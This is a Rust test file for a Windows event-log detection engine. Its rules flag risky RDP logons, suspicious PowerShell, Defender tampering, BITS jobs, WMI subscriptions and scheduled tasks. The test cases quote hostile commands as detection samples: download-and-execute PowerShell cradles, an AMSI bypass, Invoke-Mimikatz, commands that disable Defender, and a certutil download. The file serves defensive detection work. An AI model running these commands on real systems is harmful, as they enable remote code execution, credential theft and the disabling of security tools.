            ("IpAddress", "100.101.1.2"),
            ("TargetUserName", "alice"),
        ],
    );
    let js = juger(&[dehors, maison, reseau, lsm, console, rcm, tailscale]);
    let t = trouvailles(&js, "EVT-RDP-001");
    // Par volet (4624, sessions, authentifications) : le compte et d'où, l'adresse dans les détails.
    let mut objets: Vec<(usize, &str, Gravite)> = t.iter().map(|x| (x.volet, x.objet.as_str(), x.gravite)).collect();
    objets.sort_unstable();
    assert_eq!(
        objets,
        [
            (0, "internet|alice", Gravite::Alerte),
            (0, "partage|alice", Gravite::Info),
            (1, "internet|alice", Gravite::Alerte),
            (2, "internet|alice", Gravite::Alerte),
        ]
    );
    assert!(t.iter().any(|x| x.details.iter().any(|(_, v)| v == "174.127.93.2")));
    // Par un tunnel : la boucle locale, en Alerte.
    let tunnel = sec(
        4624,
        0,
        &[
            ("LogonType", "10"),
            ("IpAddress", "127.0.0.1"),
            ("TargetUserName", "alice"),
        ],
    );
    assert_eq!(gravites(&juger(&[tunnel]), "EVT-RDP-001"), [Gravite::Alerte]);
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-IDE-001
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn autres_identifiants_par_un_programme_inhabituel() {
    let par = |s, p: &str| {
        sec(
            4648,
            s,
            &[
                ("ProcessName", p),
                ("TargetUserName", "admin"),
                ("TargetServerName", "srv"),
            ],
        )
    };
    let js = juger(&[
        par(0, r"C:\Users\bob\AppData\Local\Temp\x.exe"),
        par(1, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
        par(2, r"C:\Windows\System32\svchost.exe"),
        par(3, r"C:\WINDOWS\system32\SVCHOST.EXE"),
        par(4, r"C:\Windows\System32\lsass.exe"),
        par(5, r"C:\Program Files\Sauvegarde\agent.exe"),
        par(6, r"C:\Users\bob\svchost.exe"),
        par(7, "-"),
    ]);
    let mut v: Vec<(String, Gravite)> = trouvailles(&js, "EVT-IDE-001")
        .iter()
        .map(|t| (t.objet.split('|').next().unwrap().to_string(), t.gravite))
        .collect();
    v.sort();
    assert_eq!(
        v,
        [
            (r"c:\program files\sauvegarde\agent.exe".to_string(), Gravite::Info),
            (r"c:\users\bob\appdata\local\temp\x.exe".to_string(), Gravite::Alerte),
            (r"c:\users\bob\svchost.exe".to_string(), Gravite::Alerte),
            (
                r"c:\windows\system32\windowspowershell\v1.0\powershell.exe".to_string(),
                Gravite::Alerte
            ),
        ]
    );
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-PSH-001
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn scripts_suspects() {
    let cas = [
        (
            "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')",
            Some("telecharge"),
        ),
        (
            "$w=New-Object Net.WebClient;$w.('Down'+'loadString').Invoke('http://x')",
            Some("telecharge"),
        ),
        (
            "(New-Object Net.WebClient).Dow`nloadStr`ing('http://x')",
            Some("telecharge"),
        ),
        ("iwr http://x.test/a.ps1 | iex", Some("telecharge")),
        (
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
            Some("amsi"),
        ),
        (
            "[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')",
            Some("amsi"),
        ),
        ("Invoke-Mimikatz -DumpCreds", Some("outil")),
        ("Set-MpPreference -DisableRealtimeMonitoring $true", Some("desarme")),
        ("Add-MpPreference -ExclusionPath C:\\x", Some("desarme")),
        (
            "IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))",
            Some("encode"),
        ),
        (
            "Start-Process powershell -ArgumentList '-nop -enc SQBFAFgA'",
            Some("encode"),
        ),
        ("Get-ChildItem C:\\Users | Sort-Object Length", None),
        (
            "Invoke-WebRequest https://example.test/notes.txt -OutFile notes.txt",
            None,
        ),
        ("$index = 3; Write-Output $index", None),
    ];
    for (texte, attendu) in cas {
        assert_eq!(script_suspect(texte).map(|x| x.0), attendu, "{texte}");
    }
}

#[test]
fn blocs_de_script_des_deux_powershell() {
    let bloc = |j: &str, f: &str, texte: &str, niveau: u8| {
        let mut e = ev(
            j,
            f,
            4104,
            0,
            &[
                ("MessageNumber", "1"),
                ("MessageTotal", "1"),
                ("ScriptBlockText", texte),
                ("ScriptBlockId", "{1}"),
                ("Path", ""),
            ],
        );
        e.niveau = Some(niveau);
        e
    };
    let js = juger(&[
        bloc(
            "Microsoft-Windows-PowerShell/Operational",
            "Microsoft-Windows-PowerShell",
            "IEX (iwr http://x).Content",
            5,
        ),
        bloc("PowerShellCore/Operational", "PowerShellCore", "Invoke-Mimikatz", 5),
        bloc(
            "Microsoft-Windows-PowerShell/Operational",
            "Microsoft-Windows-PowerShell",
            "Add-Type -TypeDefinition $c",
            3,
        ),
        bloc(
            "Microsoft-Windows-PowerShell/Operational",
            "Microsoft-Windows-PowerShell",
            "Get-Date",
            5,
        ),
    ]);
    let mut g = gravites(&js, "EVT-PSH-001");
    g.sort();
    assert_eq!(g, [Gravite::Info, Gravite::Alerte, Gravite::Critique]);
    assert!(regle(&js, "EVT-PSH-001").regle.limite.is_some());
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-DEF-001
// ---------------------------------------------------------------------------------------------------------------

const DEF: &str = "Microsoft-Windows-Windows Defender/Operational";
const DEFP: &str = "Microsoft-Windows-Windows Defender";

#[test]
fn defender_trouve_coupe_ou_exclut() {
    let menace = ev(
        DEF,
        DEFP,
        1116,
        0,
        &[
            ("Threat Name", "Trojan:Win32/Exemple"),
            ("Path", "file:_C:\\Users\\alice\\x.exe"),
            ("Detection User", "POSTE\\alice"),
        ],
    );
    let action = ev(
        DEF,
        DEFP,
        1117,
        5,
        &[("Threat Name", "Trojan:Win32/Exemple"), ("Action Name", "Quarantine")],
    );
    let coupe = ev(DEF, DEFP, 5001, 10, &[]);
    let exclusion = ev(
        DEF,
        DEFP,
        5007,
        20,
        &[
            ("Old Value", ""),
            (
                "New Value",
                "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Jeux = 0x0",
            ),
        ],
    );
    let reglage = ev(
        DEF,
        DEFP,
        5007,
        30,
        &[
            (
                "Old Value",
                "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableBehaviorMonitoring = 0x0",
            ),
            (
                "New Value",
                "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableBehaviorMonitoring = 0x1",
            ),
        ],
    );
    let banal = ev(
        DEF,
        DEFP,
        5007,
        40,
        &[
            (
                "Old Value",
                "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Signature Updates\\SignatureType = 0x1",
            ),
            (
                "New Value",
                "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Signature Updates\\SignatureType = 0x2",
            ),
        ],
    );
    let js = juger(&[menace, action, coupe, exclusion, reglage, banal]);
    let mut objets: Vec<&str> = trouvailles(&js, "EVT-DEF-001")
        .iter()
        .map(|t| t.objet.split([':', '|']).next().unwrap())
        .collect();
    objets.sort_unstable();
    assert_eq!(objets, ["action", "exclusion", "menace", "reglage", "temps-reel"]);
}

#[test]
fn defender_qui_n_est_pas_l_antivirus() {
    let coupe = ev(DEF, DEFP, 5001, 10, &[]);
    // Un autre antivirus : Defender se met en retrait lui-même, sans objet.
    let js = juger_avec(
        std::slice::from_ref(&coupe),
        &tout_lu(),
        Options {
            defender_antivirus: Some(false),
            ..options()
        },
    );
    // La coupure reste dite, en information, avec sa réserve : un faux antivirus inscrit (defendnot) met Defender
    // en retrait tout autant.
    let j = regle(&js, "EVT-DEF-001");
    assert!(!j.sans_objet && j.manques.is_empty());
    assert_eq!(j.trouvailles.len(), 1);
    assert_eq!(j.trouvailles[0].gravite, Gravite::Info);
    assert!(j.trouvailles[0].reserves.contains(&Reserve::AutreAntivirus));
    // Rien dans le journal : sans objet.
    let js = juger_avec(
        &[],
        &tout_lu(),
        Options {
            defender_antivirus: Some(false),
            ..options()
        },
    );
    let j = regle(&js, "EVT-DEF-001");
    assert!(j.sans_objet && j.trouvailles.is_empty() && j.manques.is_empty());
    // Une menace trouvée reste dite, même alors.
    let menace = ev(DEF, DEFP, 1116, 0, &[("Threat Name", "Trojan:Win32/Exemple")]);
    let js = juger_avec(
        &[coupe.clone(), menace],
        &tout_lu(),
        Options {
            defender_antivirus: Some(false),
            ..options()
        },
    );
    let j = regle(&js, "EVT-DEF-001");
    assert!(!j.sans_objet && j.trouvailles.len() == 2);
    // On ne sait pas : dit, jamais « sain ».
    let js = juger_avec(
        &[],
        &tout_lu(),
        Options {
            defender_antivirus: None,
            ..options()
        },
    );
    assert!(regle(&js, "EVT-DEF-001").manques.contains(&Manque::DefenderInconnu));
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-BIT-001
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn adresses_de_bits() {
    for u in [
        "http://download.windowsupdate.com/c/msdownload/update/x.cab",
        "https://dl.google.com/update2/1.3.36/GoogleUpdateSetup.exe",
        "http://msedge.b.tlu.dl.delivery.mp.microsoft.com/filestreamingservice/files/x",
        "https://download.mozilla.org/?product=firefox",
        "HTTPS://Officecdn.Microsoft.COM./pr/x.cab",
        "http://localhost:8080/x",
    ] {
        assert_eq!(adresse_inhabituelle(u), None, "{u}");
    }
    for (u, hote) in [
        (
            "https://raw.githubusercontent.com/x/y/main/p.ps1",
            "raw.githubusercontent.com",
        ),
        ("http://microsoft.com.exemple.test/a.exe", "microsoft.com.exemple.test"),
        ("http://evilmicrosoft.com/a.exe", "evilmicrosoft.com"),
        ("http://198.51.100.7:8080/a.exe", "198.51.100.7"),
        ("http://microsoft.com@example.com/a.exe", "microsoft.com@example.com"),
        (
            "http://microsoft.com\\@example.com/a.exe",
            "microsoft.com\\@example.com",
        ),
        ("ftp://exemple.test/a.exe", "exemple.test"),
    ] {
        assert_eq!(adresse_inhabituelle(u).map(|x| x.0), Some(hote.to_string()), "{u}");
    }
    assert!(adresse_inhabituelle(r"\\serveur\partage\a.exe").is_some());
    let job = ev(
        "Microsoft-Windows-Bits-Client/Operational",
        "Microsoft-Windows-Bits-Client",
        59,
        0,
        &[
            ("transferId", "{1}"),
            ("name", "x"),
            ("url", "http://exemple.test/a.exe"),
        ],
    );
    assert_eq!(gravites(&juger(&[job]), "EVT-BIT-001"), [Gravite::Alerte]);
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-WMI-001 et EVT-AUD-001
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn abonnement_wmi_permanent() {
    let x = |consommateur: &str| {
        format!(
            "<Event><System><Provider Name='Microsoft-Windows-WMI-Activity'/><EventID>5861</EventID>\
             <TimeCreated SystemTime='2026-10-18T14:05:09Z'/><EventRecordID>7</EventRecordID>\
             <Channel>Microsoft-Windows-WMI-Activity/Operational</Channel><Computer>poste-alice</Computer></System>\
             <UserData><Operation_ESStoConsumerBinding xmlns='http://manifests.microsoft.com/win/2006/windows/WMI'>\
             <Namespace>//./root/subscription</Namespace><ESS>Filtre</ESS><CONSUMER>{consommateur}</CONSUMER>\
             <PossibleCause>Binding EventFilter: …</PossibleCause></Operation_ESStoConsumerBinding></UserData></Event>"
        )
    };
    let js = juger(&[
        du_xml(&x("CommandLineEventConsumer=\"Mise a jour\"")),
        du_xml(&x("SMTPEventConsumer=\"Rapport\"")),
        // Celui que Windows pose lui-même : rien à dire (`abonnement_wmi_de_windows_lui_meme`).
        du_xml(&x("NTEventLogEventConsumer=\"SCM Event Log Consumer\"")),
    ]);
    let mut g = gravites(&js, "EVT-WMI-001");
    g.sort();
    assert_eq!(g, [Gravite::Info, Gravite::Critique]);
}

#[test]
fn politique_d_audit_changee() {
    let reduite = sec(
        4719,
        0,
        &[
            ("SubcategoryGuid", "{0CCE9215-69AE-11D9-BED3-505054503030}"),
            ("AuditPolicyChanges", "%%8448, %%8450"),
        ],
    );
    let ajoutee = sec(
        4719,
        1,
        &[
            ("SubcategoryGuid", "{0CCE922B-69AE-11D9-BED3-505054503030}"),
            ("AuditPolicyChanges", "%%8449"),
        ],
    );
    let mut g = gravites(&juger(&[reduite, ajoutee]), "EVT-AUD-001");
    g.sort();
    assert_eq!(g, [Gravite::Info, Gravite::Alerte]);
}

// ---------------------------------------------------------------------------------------------------------------
// Ce qui rend une règle non vérifiée
// ---------------------------------------------------------------------------------------------------------------

fn etat(nom: &str, lecture: Lecture, active: Option<bool>) -> EtatJournal {
    EtatJournal {
        nom: nom.into(),
        lecture,
        active,
        principal: true,
        suites: Vec::new(),
    }
}

fn sauf_securite(e: EtatJournal) -> Vec<EtatJournal> {
    let mut v: Vec<EtatJournal> = tout_lu().into_iter().filter(|x| x.nom != "Security").collect();
    v.push(e);
    v
}

#[test]
fn journal_absent_refuse_illisible_desactive_ou_partiel() {
    type Cas = (Vec<EtatJournal>, fn(&Manque) -> bool);
    let cas: Vec<Cas> = vec![
        (
            tout_lu().into_iter().filter(|x| x.nom != "Security").collect(),
            |m| matches!(m, Manque::Absent(j) if j == "Security"),
        ),
        (sauf_securite(etat("Security", Lecture::Absent, None)), |m| {
            matches!(m, Manque::Absent(_))
        }),
        (sauf_securite(etat("Security", Lecture::Refuse, None)), |m| {
            matches!(m, Manque::Refuse(_))
        }),
        (
            sauf_securite(etat("Security", Lecture::Illisible("x".into()), None)),
            |m| matches!(m, Manque::Illisible(..)),
        ),
        (
            sauf_securite(etat("Security", Lecture::Lu(Vec::new()), Some(false))),
            |m| matches!(m, Manque::Desactive(_)),
        ),
        (
            sauf_securite(etat(
                "Security",
                Lecture::Lu(vec!["2 morceaux illisibles".into()]),
                Some(true),
            )),
            |m| matches!(m, Manque::Partiel(..)),
        ),
    ];
    for (etats, attendu) in cas {
        let js = juger_avec(&[], &etats, options());
        for id in [
            "EVT-ADM-001",
            "EVT-MDP-001",
            "EVT-IDE-001",
            "EVT-AUD-001",
            "EVT-EFF-001",
            "EVT-RDP-001",
        ] {
            let j = regle(&js, id);
            assert!(!j.verifie() && j.manques.iter().any(attendu), "{id} : {:?}", j.manques);
        }
        // Une règle qui ne lit pas Security reste vérifiée.
        assert!(regle(&js, "EVT-WMI-001").verifie());
    }
}

#[test]
fn un_evenement_abime_ne_permet_pas_de_conclure() {
    // Le journal se dit lu en entier, mais un événement vient d'un morceau non vérifié : la règle n'est pas
    // vérifiée, et ce qu'elle tire de lui porte la réserve.
    let mut e = sec(4720, 0, &[("TargetUserName", "carole")]);
    e.verifie = false;
    let js = juger(&[e]);
    let j = regle(&js, "EVT-ADM-001");
    assert!(!j.verifie());
    assert!(
        j.manques
            .iter()
            .any(|m| matches!(m, Manque::NonVerifies { nombre: 1, .. }))
    );
    assert!(j.trouvailles[0].reserves.contains(&Reserve::MorceauAbime));
}

#[test]
fn periode_plus_courte_que_demandee() {
    let depuis = t0() - Duration::days(7);
    let e = sec(4624, 0, &[("LogonType", "5")]);
    let js = juger_avec(
        &[e],
        &tout_lu(),
        Options {
            depuis: Some(depuis),
            ..options()
        },
    );
    assert!(
        regle(&js, "EVT-ADM-001")
            .manques
            .iter()
            .any(|m| matches!(m, Manque::PeriodeCourte { .. }))
    );
    // Un journal calme (BITS) peut n'avoir rien écrit avant : pas un manque.
    let bits = ev(
        "Microsoft-Windows-Bits-Client/Operational",
        "Microsoft-Windows-Bits-Client",
        3,
        0,
        &[],
    );
    let js = juger_avec(
        &[bits],
        &tout_lu(),
        Options {
            depuis: Some(depuis),
            ..options()
        },
    );
    assert!(regle(&js, "EVT-BIT-001").verifie());
}

/// La preuve de la campagne d'attaque n° 3 : des journaux « Operational » présents, lus, mais vides rendaient vertes
/// les règles qui n'ont de volets que sur eux (PowerShell, BITS, WMI, Defender). Désormais : non vérifiées, avec la
/// raison (journal présent mais vide), sans alerte.
#[test]
fn journal_calme_vide_n_est_pas_verifie() {
    let evs = [
        sec(4624, 0, &[("LogonType", "5"), ("TargetUserName", "SYSTEM")]),
        ev(
            "System",
            SCM,
            7036,
            0,
            &[("param1", "Windows Update"), ("param2", "running")],
        ),
    ];
    let js = juger_nu(&evs, &tout_lu(), options());
    for id in ["EVT-PSH-001", "EVT-BIT-001", "EVT-WMI-001", "EVT-DEF-001"] {
        let j = regle(&js, id);
        assert!(!j.verifie(), "{id}");
        assert!(j.trouvailles.is_empty(), "{id}");
        assert!(
            j.manques.iter().any(|m| matches!(m, Manque::VideCalme(_))),
            "{id} : {:?}",
            j.manques
        );
    }
    // Un événement dans chacun : vérifiées.
    let js = juger(&[]);
    for id in ["EVT-PSH-001", "EVT-BIT-001", "EVT-WMI-001", "EVT-DEF-001"] {
        assert!(regle(&js, id).verifie(), "{id} : {:?}", regle(&js, id).manques);
    }
}

#[test]
fn tout_lu_et_rien_trouve_est_verifie() {
    let js = juger(&[sec(4624, 0, &[("LogonType", "5")])]);
    for j in &js {
        assert!(j.trouvailles.is_empty(), "{}", j.regle.id);
        assert!(j.verifie(), "{} : {:?}", j.regle.id, j.manques);
    }
}

#[test]
fn bornes_tenues() {
    let bornes = BornesMoteur {
        trouvailles: 3,
        dates: 25,
        ..BornesMoteur::default()
    };
    let mut m = Moteur::nouveau(REGLES, options(), bornes);
    for i in 0..10 {
        m.recevoir(&sec(4720, i, &[("TargetUserName", &format!("c{i}"))]));
    }
    for i in 0..40 {
        m.recevoir(&echec(i, "alice", "-", "3"));
    }
    let js = m.conclure(&tout_lu());
    let adm = regle(&js, "EVT-ADM-001");
    assert_eq!((adm.trouvailles.len(), adm.au_dela), (3, 7));
    let mdp = regle(&js, "EVT-MDP-001");
    assert!(!mdp.trouvailles.is_empty(), "{:?}", mdp.manques);
    assert!(
        mdp.manques.iter().any(|x| matches!(x, Manque::Bornes(_))),
        "{:?}",
        mdp.manques
    );
}

#[test]
fn champs_hostiles_sans_panique() {
    let long = "é".repeat(200_000);
    let bizarres = [
        "",
        "-",
        "\u{0}",
        "0x",
        "0xFFFFFFFFFFFFFFFFFFFF",
        "\"",
        "\"\"",
        "~1",
        "a~",
        "::",
        "[",
        "http://",
        "http://@",
        "%%",
        &long,
    ];
    let mut evs = Vec::new();
    for b in bizarres {
        for (j, f, id) in [
            ("Security", AUDIT, 4625),
            ("Security", AUDIT, 4624),
            ("Security", AUDIT, 4648),
            ("Security", AUDIT, 4738),
            ("Security", AUDIT, 4732),
            ("System", SCM, 7045),
            (
                "Microsoft-Windows-PowerShell/Operational",
                "Microsoft-Windows-PowerShell",
                4104,
            ),
            (
                "Microsoft-Windows-Bits-Client/Operational",
                "Microsoft-Windows-Bits-Client",
                59,
            ),
            (DEF, DEFP, 5007),
        ] {
            let noms = [
                "TargetUserName",
                "IpAddress",
                "LogonType",
                "ProcessName",
                "OldUacValue",
                "NewUacValue",
                "TargetSid",
                "ImagePath",
                "ServiceName",
                "ScriptBlockText",
                "url",
                "New Value",
            ];
            let champs: Vec<(&str, &str)> = noms.iter().map(|n| (*n, b)).collect();
            evs.push(ev(j, f, id, 0, &champs));
        }
    }
    let js = juger(&evs);
    for j in &js {
        for t in &j.trouvailles {
            assert!(t.objet.chars().count() <= super::moteur::TEXTE_MAX + 1);
            assert!(
                t.details
                    .iter()
                    .all(|(_, v)| v.chars().count() <= super::moteur::TEXTE_MAX + 1)
            );
        }
    }
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-TAC-001
// ---------------------------------------------------------------------------------------------------------------

const TACHES: &str = "Microsoft-Windows-TaskScheduler/Operational";

/// Le XML d'une tâche, tel que le 4698 le porte : une action « Exec ».
fn xml_tache(commande: &str, arguments: &str) -> String {
    format!(
        "<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task version=\"1.2\"><RegistrationInfo><Author>SALON-PC\\alice</Author>\
         </RegistrationInfo><Actions Context=\"Author\"><Exec><Command>{commande}</Command><Arguments>{arguments}</Arguments>\
         </Exec></Actions></Task>"
    )
}

/// Un 4698 (ou 4702) sur l'ordinateur « Salon-PC », par alice.
fn tache(id: u32, nom: &str, commande: &str, arguments: &str) -> EvenementWindows {
    let contenu = xml_tache(commande, arguments);
    let champ = if id == 4702 { "TaskContentNew" } else { "TaskContent" };
    let mut e = sec(
        id,
        0,
        &[
            ("SubjectUserName", "alice"),
            ("SubjectDomainName", "SALON-PC"),
            ("TaskName", nom),
            (champ, &contenu),
        ],
    );
    e.ordinateur = "Salon-PC".into();
    e
}

#[test]
fn taches_jugees_par_leur_action() {
    let cas: &[(u32, &str, &str, Option<Gravite>)] = &[
        (
            4698,
            "powershell.exe",
            "-NoProfile -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
            Some(Gravite::Alerte),
        ),
        (
            4698,
            "C:\\Users\\alice\\AppData\\Local\\Temp\\maj.exe",
            "",
            Some(Gravite::Alerte),
        ),
        (4698, "C:\\Users\\Public\\x.exe", "", Some(Gravite::Alerte)),
        (4698, "cmd.exe", "/c start notepad", Some(Gravite::Alerte)),
        (4698, "%COMSPEC%", "/c whoami", Some(Gravite::Alerte)),
        (
            4698,
            "%localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe",
            "/reporting",
            Some(Gravite::Info),
        ),
        (4698, "C:\\ProgramData\\Outil\\outil.exe", "", Some(Gravite::Info)),
        // Une tâche ordinaire créée : une information ; changée : rien.
        (
            4698,
            "C:\\Program Files\\Sauvegarde\\copie.exe",
            "--nuit",
            Some(Gravite::Info),
        ),
        (4702, "C:\\Program Files\\Sauvegarde\\copie.exe", "--nuit", None),
        // Les tâches de Windows que les mises à jour récrivent.
        (
            4702,
            "%windir%\\system32\\rundll32.exe",
            "/d acproxy.dll,PerformAutochkOperations",
            None,
        ),
        (
            4702,
            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25010.11-0\\MpCmdRun.exe",
            "Scan -ScheduleJob",
            None,
        ),
        // rundll32 qui va chercher ailleurs, ou un chemin qui sort du dossier de Defender.
        (
            4702,
            "rundll32.exe",
            "C:\\Users\\alice\\AppData\\Roaming\\x.dll,Lancer",
            Some(Gravite::Alerte),
        ),
        (
            4702,
            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\..\\..\\..\\x.exe",
            "",
            Some(Gravite::Info),
        ),
        (
            4702,
            "C:\\Windows\\System32\\certutil.exe",
            "-urlcache -f http://x.test/a a.exe",
            Some(Gravite::Alerte),
        ),
    ];
    for (id, commande, arguments, attendu) in cas {
        let js = juger(&[tache(*id, "\\Essai", commande, arguments)]);
        let g = gravites(&js, "EVT-TAC-001");
        assert_eq!(
            g,
            attendu.iter().copied().collect::<Vec<_>>(),
            "{id} {commande} {arguments}"
        );
        if attendu.is_some() {
            let t = &trouvailles(&js, "EVT-TAC-001")[0];
            assert_eq!(t.ordinateur, "Salon-PC");
            assert!(t.details.iter().any(|(_, v)| v == "\\Essai"), "{:?}", t.details);
            assert!(t.details.iter().any(|(_, v)| v == "SALON-PC\\alice"), "{:?}", t.details);
        }
    }
}

/// Le 4698 tel que Windows le rend : le XML de la tâche échappé dans celui de l'événement, ses guillemets deux fois.
#[test]
fn tache_lue_dans_le_xml_de_windows() {
    let x = "<Event><System><Provider Name='Microsoft-Windows-Security-Auditing'/><EventID>4698</EventID><Level>0</Level>\
             <TimeCreated SystemTime='2026-10-18T14:05:09Z'/><EventRecordID>4242</EventRecordID>\
             <Channel>Security</Channel><Computer>Salon-PC</Computer></System><EventData>\
             <Data Name='SubjectUserName'>alice</Data><Data Name='TaskName'>\\Mise a jour</Data>\
             <Data Name='TaskContent'>&lt;?xml version=\"1.0\" encoding=\"UTF-16\"?&gt;&lt;Task&gt;&lt;Actions&gt;&lt;Exec&gt;\
             &lt;Command&gt;mshta.exe&lt;/Command&gt;&lt;Arguments&gt;&amp;quot;javascript:a=1&amp;quot;&lt;/Arguments&gt;\
             &lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;</Data></EventData></Event>";
    let js = juger(&[du_xml(x)]);
    let t = trouvailles(&js, "EVT-TAC-001");
    assert_eq!(t.len(), 1);
    assert_eq!(t[0].gravite, Gravite::Alerte);
    assert!(
        t[0].details.iter().any(|(_, v)| v == "mshta.exe \"javascript:a=1\""),
        "{:?}",
        t[0].details
    );
}

#[test]
fn actions_d_une_tache_hostile() {
    // Plusieurs actions : chacune ; une balise sans fin, une action sans commande, des balises en majuscules.
    let x = "<EXEC><COMMAND>a.exe</COMMAND></EXEC><Exec><Arguments>x</Arguments></Exec><Exec><Command>b.exe\
             </Command><Arguments>-y</Arguments></Exec><Exec><Command>c.exe";
    assert_eq!(
        actions_de_tache(x).0,
        vec![
            ("a.exe".to_string(), String::new()),
            ("b.exe".to_string(), "-y".to_string())
        ]
    );
    // Une lettre dont la minuscule change de longueur ne décale pas la lecture.
    let x = "<Exec><Command>İİİ\\cmd.exe</Command></Exec>";
    assert_eq!(actions_de_tache(x).0[0].0, "İİİ\\cmd.exe");
    // Des milliers d'actions : au plus 32.
    let x = "<Exec><Command>a.exe</Command></Exec>".repeat(1000);
    assert_eq!(actions_de_tache(&x).0.len(), 32);
}

/// Un champ forgé d'un Mio (des blocs sans commande, ou sans fin) se lit vite, et seulement jusqu'à sa borne : la
/// tâche ainsi démesurée est une alerte, même changée (4702), jamais un silence.
#[test]
fn tache_demesuree_lue_vite() {
    let debut = std::time::Instant::now();
    for x in [
        "<exec>".repeat((1 << 20) / 6),
        "<exec><arguments>x</arguments></exec>".repeat((1 << 20) / 37),
        "<exec><command>".repeat((1 << 20) / 15),
    ] {
        let (actions, tronque) = actions_de_tache(&x);
        assert!(actions.is_empty() && tronque);
    }
    assert!(
        debut.elapsed() < std::time::Duration::from_secs(5),
        "{:?}",
        debut.elapsed()
    );
    let mut x = xml_tache("C:\\Program Files\\App\\app.exe", "");
    x.push_str(&" ".repeat(70 * 1024));
    let mut e = tache(4702, "\\Essai", "", "");
    e.champs.retain(|(n, _)| n != "TaskContentNew");
    e.champs.push(("TaskContentNew".into(), x));
    assert_eq!(gravites(&juger(&[e]), "EVT-TAC-001"), [Gravite::Alerte]);
}

#[test]
fn historique_du_planificateur() {
    let inscrite = ev(
        TACHES,
        "Microsoft-Windows-TaskScheduler",
        106,
        0,
        &[("TaskName", "\\Essai"), ("UserContext", "SALON-PC\\alice")],
    );
    let lancee = ev(
        TACHES,
        "Microsoft-Windows-TaskScheduler",
        200,
        5,
        &[
            ("TaskName", "\\Essai"),
            (
                "ActionName",
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            ),
        ],
    );
    let ordinaire = ev(
        TACHES,
        "Microsoft-Windows-TaskScheduler",
        200,
        6,
        &[
            ("TaskName", "\\Autre"),
            ("ActionName", "C:\\Program Files\\App\\app.exe"),
        ],
    );
    let js = juger(&[inscrite, lancee, ordinaire]);
    assert_eq!(gravites(&js, "EVT-TAC-001"), [Gravite::Alerte, Gravite::Info]);
}

/// 140 (tâche mise à jour) : une information avec le nom de la tâche et le compte, jamais une alerte ; une tâche mise
/// à jour plusieurs fois fait une seule ligne ; mille tâches forgées tiennent dans les bornes de la règle.
#[test]
fn tache_mise_a_jour_dite_en_information() {
    let mise_a_jour = |s: i64, nom: &str| {
        ev(
            TACHES,
            "Microsoft-Windows-TaskScheduler",
            140,
            s,
            &[("TaskName", nom), ("UserName", "alice")],
        )
    };
    let js = juger(&[
        mise_a_jour(0, "\\Exemple\\Sauvegarde"),
        mise_a_jour(60, "\\Exemple\\Sauvegarde"),
    ]);
    let t = trouvailles(&js, "EVT-TAC-001");
    assert_eq!(t.len(), 1, "{t:?}");
    assert_eq!((t[0].gravite, t[0].nombre), (Gravite::Info, 2));
    // Préfixé : jamais le même objet (donc la même normale) qu'un lancement (200) ou une création (4698).
    assert_eq!(t[0].objet, "maj|\\exemple\\sauvegarde");
    let corps = resultat::corps(&t[0]);
    assert!(corps.contains("mise à jour"), "{corps}");
    assert!(
        corps.contains("\\Exemple\\Sauvegarde") && corps.contains("alice"),
        "{corps}"
    );
    // Même nommée comme un programme d'attaque, la tâche mise à jour ne dit rien de ce qu'elle lance : information.
    let js = juger(&[mise_a_jour(0, "\\Temp\\powershell.exe -enc AAAA")]);
    assert_eq!(gravites(&js, "EVT-TAC-001"), [Gravite::Info]);
    // Bornée comme les autres volets : au-delà, comptée.
    let bornes = BornesMoteur {
        trouvailles: 3,
        ..BornesMoteur::default()
    };
    let mut m = Moteur::nouveau(REGLES, options(), bornes);
    for i in 0..1000 {
        m.recevoir(&mise_a_jour(i, &format!("\\Exemple\\T{i}")));
    }
    let js = m.conclure(&tout_lu());
    let tac = regle(&js, "EVT-TAC-001");
    assert_eq!((tac.trouvailles.len(), tac.au_dela), (3, 997));
    assert_eq!(tac.au_dela_pire, Some(Gravite::Info));
}

/// Deux sources de rechange : l'une lue et prouvée suffit ; aucune, non vérifiée, avec le réglage à allumer.
#[test]
fn taches_verifiees_par_l_une_ou_l_autre_source() {
    let sans_historique: Vec<EtatJournal> = tout_lu().into_iter().filter(|e| e.nom != TACHES).collect();
    // Ni audit prouvé, ni historique : non vérifiée, et le texte dit quoi allumer.
    let j = regle(&juger_avec(&[], &sans_historique, options()), "EVT-TAC-001").clone();
    assert!(!j.verifie());
    assert!(j.manques.contains(&Manque::Absent(TACHES.into())), "{:?}", j.manques);
    let (texte, _) = resultat::manque(
        &Source::Vivant,
        j.manques
            .iter()
            .find(|m| matches!(m, Manque::NonAudite { .. }))
            .unwrap(),
    );
    assert!(
        texte.contains("Auditer d'autres événements d'accès à l'objet"),
        "{texte}"
    );
    assert!(texte.contains("historique"), "{texte}");
    // L'audit prouvé (une tâche changée vue) : vérifiée sans l'historique.
    let changee = tache(4702, "\\Essai", "C:\\Program Files\\App\\app.exe", "");
